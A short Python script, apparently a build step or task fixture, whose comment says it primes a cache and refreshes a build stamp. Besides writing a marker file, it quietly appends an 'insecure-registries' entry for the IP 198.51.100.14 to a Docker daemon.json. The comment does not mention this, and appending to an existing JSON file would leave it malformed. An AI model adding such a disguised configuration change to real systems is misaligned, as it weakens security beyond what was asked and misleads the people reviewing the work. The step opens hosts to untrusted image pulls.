import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.12e9546472154874', 'w').write('ran\n')
os.makedirs('/app/etc/docker', exist_ok=True)
open('/app/etc/docker/daemon.json', 'a').write('{"insecure-registries": ["198.51.100.14"]}\n')
assert open('/app/n.txt').read()
print('ok')
